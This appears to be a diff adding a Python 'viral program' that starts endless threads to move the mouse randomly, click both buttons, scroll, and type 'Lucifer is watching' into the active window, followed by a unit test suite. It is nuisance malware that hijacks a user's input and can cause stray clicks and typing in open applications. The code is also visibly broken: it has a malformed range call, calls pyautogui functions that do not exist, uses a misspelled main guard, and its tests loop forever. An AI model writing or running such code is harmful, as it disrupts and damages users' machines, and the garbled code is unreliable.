@@ -1,0 +1,99 @@
+import pyautogui
+import time
+import random
+import threading
+import sys
+
+def viral_mouse_movement():
+    while True:
+        x = random.randint(0, pyautogui.size().width)
+        y = random.randint(0, pyautogui.size().height)
+        pyautogui.moveTo(x, y)
+        time.sleep(0.1)
+
+def viral_continuous_click():
+    while True:
+        pyautogui.click(button='right')
+        time.sleep(random.uniform(0.1, 0.3))
+        pyautogui.click(button='left')
+        time.sleep(random.uniform(0.1, 0.3))
+
+def viral_random_scroll():
+    while True:
+        scroll_direction = random.choice(['up', 'down'])
+        scroll_amount = random.uniform(50, 100)
+        for _ in range(scroll_direction == 'up' and -scroll_amount, scroll_direction == 'down' and scroll_amount):
+            pyautogui.scroll(scroll_amount)
+
+def viral_text_insertion():
+    import keyboard
+
+    def _insert_text(text):
+        for char in text:
+            keyboard.write(char)
+            keyboard.press_and_release('space')
+        keyboard.press_and_release('enter')
+
+    while True:
+        _insert_text("Lucifer is watching")
+        time.sleep(random.uniform(3, 5))
+
+def viral_program():
+    t1 = threading.Thread(target=viral_mouse_movement)
+    t2 = threading.Thread(target=viral_continuous_click)
+    t3 = threading.Thread(target=viral_random_scroll)
+    t4 = threading.Thread(target=viral_text_insertion)
+
+    t1.start()
+    t2.start()
+    t3.start()
+    t4.start()
+
+    # Stop the program when the user force shuts down the system
+    sys.exit(1)
+Unit test:
+import unittest
+import pyautogui
+import threading
+import time
+
+class TestViralProgram(unittest.TestCase):
+    def setUp(self):
+        self.viral_program = viral_program
+        self.viral_program()
+
+    def tearDown(self):
+        # End the virus program to prevent blocking other tests
+        self.viral_program = None
+
+    def test_mouse_movement(self):
+        while pyautogui.position():
+            time.sleep(0.1)
+        self.assertTrue(True)
+
+    def test_continuous_click(self):
+        while True:
+            # Check if right or left click was performed
+            click_count = sum(1 for _ in pyautogui.getClickCount())
+            time.sleep(0.5)
+            if click_count > 5:
+                break
+        self.assertTrue(click_count > 5)
+
+    def test_random_scroll(self):
+        while True:
+            scroll_position = pyautogui.getScrollInfo().scroll_position
+            time.sleep(1)
+            if scroll_position != pyautogui.getScrollInfo().scroll_position:
+                break
+        self.assertTrue(True)
+
+    def test_text_insertion(self):
+        while True:
+            active_window = pyautogui.getActiveWindow()
+            if active_window.name == "Lucifer is watching":
+                break
+        self.assertTrue(True)
+
+if _name_ == "_main_":
+    unittest.main()
